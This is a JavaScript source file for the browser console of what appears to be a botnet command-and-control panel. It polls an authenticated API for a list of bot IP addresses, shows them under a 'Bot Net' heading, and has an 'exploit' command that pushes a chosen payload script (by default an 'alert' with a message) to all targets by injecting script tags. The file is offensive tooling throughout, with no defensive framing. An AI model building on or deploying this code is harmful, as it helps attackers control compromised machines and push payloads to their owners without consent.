function foc() { document.getElementById("cmd").focus(); }
console.log("focus");
window.setInterval(fetchList, 3000);
window.setInterval(foc, 500);
console.log("timeout");

var params = {};
params['target'] = "all";
params['payload'] = "alert";
params['message'] = "payload 1";
var gpass = "";
var gbuffer = [];
var gbidx = -1;

function fetchList() {
	if (gpass) { 
		console.log("fetchlist");
		cs("/api.php?auth="+gpass+"&A=list");
	}
}
function update_list() {
	console.log("update");
	var o = "<ul>";
	for (var i in host_list) {
		o += "<li>"+host_list[i]['remote_ip']+"</li>";
	}
	o += "</ul>";
	document.getElementById("list_title").innerHTML = "Bot Net (" + host_list.length + ")";
	document.getElementById("list_content").innerHTML = o;
}
function cs(s) { console.log("cs: " + s); 
	var script = document.createElement("script");
	script.type="text/javascript";
	script.src=s;
	d=document.getElementById("inject");
	d.appendChild(script);
}
//	append("<script src='"+s+"'></script>"); }
function append(t) {d = document.getElementById('inject');console.log(d);r=d.innerHTML;console.log(r);d.innerHTML=t; }
function com_out(t) { document.getElementById('cmd_content').innerHTML += t + "<br />"; }

function docommand(event) {
elm = document.getElementById("cmd");
if(event && event.keyCode == 13) {
	gbuffer.push(elm.value);
	gbidx++;
	var p = elm.value.split(" ");
	//console.log(p);
	com_out(p.length);
	switch(p[0]) {
		case "unlock":
			gpass= p[1];
			com_out("password set<br />API unlocked");
			break;

		case "set":
			if (p.length > 2) {
				var name = p[1]
				var v = p.slice(2).join(" ");
				params[name] = v
				com_out(name + " set to " + v);
				//console.log(p);
				//console.log(p[1] = params[p[1]]);
			}
			break;

		case "exploit":
			cs("/"+params['payload']+".php?message="+params['message']);
			break;
	}

	elm.value = "";
}

else if (event && event.keyCode == 38) {
	//if (gbidx == gbuffer.length -1 && elm.value.length > 0) { console.log("push!"); gbuffer.push(elm.value); }
	console.log(gbidx +  " up " +  gbuffer.length);
	if (gbidx > 0) {
		//gbidx--;
		elm.value = gbuffer[gbidx--];
	}
} else if (event && event.keyCode == 40) {
	console.log(gbidx +  " down " + gbuffer.length);
	if (gbidx < gbuffer.length) {
		//gbidx++;
		elm.value = gbuffer[gbidx++];
	} if (gbidx >= gbuffer.length) {
		elm.value = "";
	}
}

}
